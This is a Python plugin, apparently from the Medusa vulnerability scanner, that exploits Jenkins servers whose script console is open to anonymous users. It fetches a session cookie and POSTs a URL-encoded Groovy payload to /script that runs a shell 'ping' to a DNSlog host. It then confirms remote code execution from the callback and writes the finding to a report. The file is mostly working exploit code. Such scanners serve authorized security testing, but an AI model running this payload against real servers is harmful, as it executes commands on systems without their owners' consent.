#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import re
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-11-11"  # 插件编辑时间
        self.info['disclosure']='2019-11-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "JenkinsConfigurationErrorCausesUnauthorizedCodeExecutionVulnerability"  # 插件名称
        self.info['name'] ='Jenkins配置错误导致未经授权的代码执行漏洞' #漏洞名称
        self.info['affects'] = "Jenkins"  # 漏洞组件
        self.info['desc_content'] = "Jenkins当用户勾选任意用户有代码执行的权利的话会导致漏洞产生"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "关闭选项设置，改成需要登录才能执行代码"  # 修复建议
        self.info['version'] = "全版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    DL = ClassCongregation.Dnslog()  # 初始化DNSlog
    DL.dns_host()
    post_data = '''script%3dprintln+%22ping+{}%22.execute().text%26Jenkins-Crumb%3d32bfdadca3609e1e2f8e8414a0f363c16dd4115eb4e6af6305f2383a0ae40610%26json%3d%7b%22script%22%3a+%22println+%5c%22ping+{}%5c%22.execute().text%22%2c+%22%22%3a+%22%22%2c+%22Jenkins-Crumb%22%3a+%2232bfdadca3609e1e2f8e8414a0f363c16dd4115eb4e6af6305f2383a0ae40610%22%7d%26Submit%3d%e8%bf%90%e8%a1%8c'''.format(
        DL.dns_host(), DL.dns_host())
    payload = "/script"

    try:
        payload_url = scheme + "://" + url + ':' + str(port) + payload
        s = requests.session()
        cookises=re.compile('.*Cookie (.*) for.*').findall(str(s.get(payload_url,timeout=6,proxies=proxies,verify=False).cookies))[0]#正则匹配获取的Cookie字符串
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cookis':cookises
        }
        resp = s.post(payload_url,headers=headers, data=post_data,timeout=6,proxies=proxies, verify=False)

        con = resp.text
        if DL.result():
            Medusa = "{}Jenkins配置不当导致未授权代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\n返回数据包:{}\r\nDNSlog内容:{}\r\n".format(url, payload_url,con,DL.dns_host())
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l=ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
